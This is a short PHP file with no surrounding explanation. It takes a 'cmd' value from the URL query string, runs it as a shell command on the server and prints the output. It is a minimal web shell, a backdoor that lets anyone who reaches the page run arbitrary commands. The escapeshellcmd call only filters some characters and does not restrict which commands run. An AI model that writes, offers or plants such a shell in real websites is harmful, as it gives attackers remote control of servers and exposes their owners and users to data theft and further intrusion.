<?php

if (isset($_GET['cmd'])) {
    $command = escapeshellcmd($_GET['cmd']);
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
